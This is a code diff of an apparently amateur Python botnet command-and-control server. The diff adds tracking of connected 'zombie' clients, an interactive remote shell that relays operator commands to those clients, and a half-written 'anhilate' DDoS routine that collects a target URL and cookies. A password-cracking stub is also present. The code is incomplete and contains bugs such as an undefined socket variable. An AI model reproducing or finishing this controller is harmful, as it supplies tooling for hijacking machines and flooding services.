@@ -1,8 +1,7 @@
 import socket
 #For logging time
 import time
-import shlex
-import subprocess
+import os
 #For clean exit we use sys
 import sys
 import threading
@@ -28,8 +27,10 @@ class CnC:
             sys.exit()
         while True:
             client_socket, addr = self.socket.accept()
+            self.Active.append(addr)
             client_thread = threading.Thread(target=self.handler,args=(client_socket,addr))
             client_thread.start()
+        os.remove("temp")
     
     def handler(self,client_socket,addr):
         response = client_socket.recv(4096)
@@ -43,11 +44,13 @@ class CnC:
                 client_socket.send(bytes(zombie,'utf-8'))
             else:
                 client_socket.send(b"ACK")
+        with open("temp","a+") as t:
+                t.write(str(addr[0]) + ':' + str(addr[1])+'\n')
+    def options(self):#,client_socket,client_addr):
         while True:
             self.Ccommand = input("<*> ")
             #List active connections etc.
             if self.Ccommand == 'list':
-                print("Broo youre a genius")
                 self.list()
             elif self.Ccommand == 'activate':
                 self.activate()
@@ -59,7 +62,9 @@ class CnC:
                 self.send()
             #For DDoS
             elif self.Ccommand == 'anhilate':
-                self.anhilate()
+                query = self.anhilate()
+                #Check how to send the query for DoS
+                client_socket.send(query)
             elif self.Ccommand == 'hashcracker':
                 self.hashcracker()
             #In working
@@ -71,7 +76,8 @@ class CnC:
 
     
     def list(self):
-        pass
+        for i in self.Active:
+            print(i[0]+ ":" + i[1])
 
     def activate(self):
         pass
@@ -86,16 +92,31 @@ class CnC:
             dir = client_socket.recv(4096).decode()
             command = input(dir+'> ')'''
             command = input("<*SHELL*> ")
-            if command.lower() != 'terminate\n' or 'exit\n':
-                print(command)
+            if (command.lower() != ('terminate\n' or 'exit\n')) and (command != "\n"):
+                #print(command)
                 client_socket.send(bytes(command,'utf-8'))
-                print(client_socket.recv(4096).decode())
+                print(client_socket.recv(4096).decode(),end="")
     
     def send(self):
         pass
 
     def anhilate(self):
-        pass
+        option = str(input("Press 1 for program assisted request or 2 for manually entering the request: "))
+        if option == '1':
+            url = input("Enter the url here: ")
+            cookies = {}
+            if input("Are there any cookies? (Y or N): ").lower() == 'y':
+                key = ' '
+                print("First enter the cookie key then the cookie value (cookie_key=cookie_value)")
+                while key != '':
+                    key = str(input("Enter cookie key: "))
+                    value = str(input("Enter cookie value: "))
+                    if key != '':
+                        cookies[key] = value
+            return (url,cookies)
+        if option == '2':
+            return 'a'
+
 
     def hashcracker(self):
         pass
@@ -115,6 +136,7 @@ def main():
     while True:
         #server.Ccommand = input("<*> ")
         server.server_loop()
+        server.options()
 
 if __name__ == '__main__':
     main()
